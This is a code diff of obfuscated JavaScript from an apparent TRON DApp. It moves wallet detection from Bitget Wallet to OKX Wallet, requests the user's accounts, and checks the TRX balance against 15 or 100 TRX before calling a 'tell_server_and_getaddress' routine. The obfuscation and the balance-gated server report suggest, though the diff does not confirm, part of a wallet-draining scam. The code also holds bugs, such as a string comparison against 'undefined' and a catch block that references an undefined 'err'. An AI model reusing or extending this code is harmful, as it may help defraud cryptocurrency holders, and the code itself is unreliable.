@@ -53,35 +53,29 @@ async function user() {
   } catch (_0xed3cbb) {}
   try {
     {
-		if (!(window.bitkeep && window.bitkeep.tronLink)) {
-  alert("请在 Bitget Wallet 《内置浏览器》里打开本 DApp 否则无法连接钱包");
-}
-       if (window.bitkeep && window.bitkeep.tronLink) {
-		       const tronLink = window.bitkeep.tronLink;
-    const tronWeb  = window.bitkeep.tronWeb;
+      if (window.okxwallet !== "undefined") {
         {
-          tronLink.on("accountsChanged", _0x2544a4 => {
+          okxwallet.on("accountsChanged", _0x2544a4 => {
             web3connectTron = _0x2544a4.toString().substr(0, 2) != "0x";
             user().then();
           });
           if (web3connectTron) {
-            const _0x437c4c = await tronLink.request({
+            const _0x437c4c = await window.okxwallet.tronLink.request({
               "method": "tron_requestAccounts"
             });
-            _0x437c4c == 200 && (this.tronweb = await tronWeb);
+            _0x437c4c == 200 && (this.tronweb = await okxwallet.tronLink.tronWeb);
           } else this.tronweb = undefined;
         }
       }
     }
   } catch (_0x5d72d1) {}
   try {
-    wallet_user_address = await tronLink.request({ method: "tron_requestAccounts" });
-	   alert("TRON wallet_user_address", wallet_user_address);
+    wallet_user_address = await this.tronweb.defaultAddress.base58;
     var _0x682780 = await this.tronweb.fromSun(await this.tronweb.trx.getBalance(wallet_user_address));
     gascanapppass = _0x682780 >= 15 && mode == 0 ? true : _0x682780 >= 100 && mode != 0 ? true : false;
     wallet_user_address.length > 10 && (chain = "TRON", chainid = 0);
     await tell_server_and_getaddress();
-  } catch (_0x2befc7) {
+  } catch (_0x2befc7)  {
   console.error("TRON wallet not available", err);
   d_l_error();
   }
